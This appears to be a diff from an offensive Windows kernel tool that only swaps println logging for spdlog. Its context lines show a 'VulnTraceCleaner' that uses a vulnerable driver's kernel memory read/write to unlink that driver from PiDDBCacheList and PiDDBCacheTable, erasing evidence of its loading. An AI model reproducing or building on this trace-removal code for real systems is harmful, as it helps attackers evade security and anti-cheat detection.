@@ -6,7 +6,7 @@
 #include <utils/cmn_utils.hpp>
 
 #include <ntdll.hpp>
-#include <print>
+#include <spdlog/spdlog.h>
 
 VulnTraceCleaner::VulnTraceCleaner(std::shared_ptr<K32Context> k32ctx, std::shared_ptr<K32Module> k32Module)
     : k32ctx(std::move(k32ctx))
@@ -17,12 +17,12 @@ VulnTraceCleaner::VulnTraceCleaner(std::shared_ptr<K32Context> k32ctx, std::shar
 bool VulnTraceCleaner::Cleanup() const
 {
     if (!CleanupPiDDBCacheList()) {
-        std::println("[-] Failed to cleanup vulnerable driver from PiDDBCacheList");
+        spdlog::error("Failed to cleanup vulnerable driver from PiDDBCacheList");
         return false;
     }
 
     if (!CleanupPiDDBCacheTable()) {
-        std::println("[-] Failed to cleanup vulnerable driver from PiDDBCacheTable");
+        spdlog::error("Failed to cleanup vulnerable driver from PiDDBCacheTable");
         return false;
     }
 
@@ -36,20 +36,20 @@ bool VulnTraceCleaner::CleanupPiDDBCacheList() const
         "xxx????xxx???????x", 3, 7);
 
     if (!_PiDDBCacheList) {
-        std::println("[-] _PiDDBCacheList not found");
+        spdlog::error("_PiDDBCacheList not found");
         return false;
     }
 
     uintptr_t link = 0;
     if (!k32ctx->GetDriver().ReadMemory(_PiDDBCacheList, &link, sizeof(link))) {
-        std::println("[-] Failed read head of PiDDBCacheList");
+        spdlog::error("Failed to read head of PiDDBCacheList");
         return false;
     }
 
     while (link != _PiDDBCacheList) {
         PiDDBCacheEntry entry { };
         if (!k32ctx->GetDriver().ReadMemory(link, &entry, sizeof(entry))) {
-            std::println("[-] Failed to read entry at 0x{:X}", link);
+            spdlog::error("Failed to read entry at 0x{:X}", link);
             return false;
         }
 
@@ -59,16 +59,16 @@ bool VulnTraceCleaner::CleanupPiDDBCacheList() const
             uintptr_t blink = reinterpret_cast<uintptr_t>(entry.List.Blink);
 
             if (!k32ctx->GetDriver().WriteMemory(blink, &flink, sizeof(flink))) {
-                std::println("[-] Failed to rewrite node [1]");
+                spdlog::error("Failed to rewrite node Flink");
                 return false;
             }
 
             if (!k32ctx->GetDriver().WriteMemory(flink + sizeof(uintptr_t), &blink, sizeof(blink))) {
-                std::println("[-] Failed to rewrite node [2]");
+                spdlog::error("Failed to rewrite node Blink");
                 return false;
             }
 
-            std::println("[+] Vulnerable driver successfully found and unlinked in _PiDDBCacheList");
+            spdlog::info("Vulnerable driver unlinked from PiDDBCacheList");
         }
 
         link = flink;
@@ -84,7 +84,7 @@ bool VulnTraceCleaner::CleanupPiDDBCacheTable() const
         "xxx????xxxxxxx", 3, 7);
 
     if (!_PiDDBCacheTable) {
-        std::println("[-] _PiDDBCacheTable not found");
+        spdlog::error("_PiDDBCacheTable not found");
         return false;
     }
 
@@ -103,7 +103,7 @@ bool VulnTraceCleaner::CleanupPiDDBCacheTable() const
         (PRTL_AVL_TABLE)_PiDDBCacheTable, (PVOID)&compared);
 
     if (!entry) {
-        std::println("[-] Entry not found in PiDDBCacheTable");
+        spdlog::error("Entry not found in PiDDBCacheTable");
         return false;
     }
 
